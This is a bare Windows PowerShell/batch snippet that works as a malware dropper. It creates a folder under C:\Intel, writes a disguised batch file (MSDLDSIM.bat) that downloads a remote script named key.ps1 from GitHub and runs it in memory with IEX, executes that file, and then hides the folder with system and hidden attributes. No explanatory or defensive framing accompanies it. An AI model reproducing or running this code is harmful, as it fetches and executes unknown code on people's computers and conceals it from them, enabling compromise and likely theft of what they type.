md C:\Intel\Profiles/IE/IEX2; $contentToAdd = @"
powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/key.ps1').GetResponse().GetResponseStream()).ReadToEnd());
"@; add-content "C:\Intel\Profiles/IE/IEX2/MSDLDSIM.bat"
cd C:\Intel\Profiles\IE\IEX2; MSDLDSIM.bat
cd C:\
attrib +s +r +h +a intel
exit
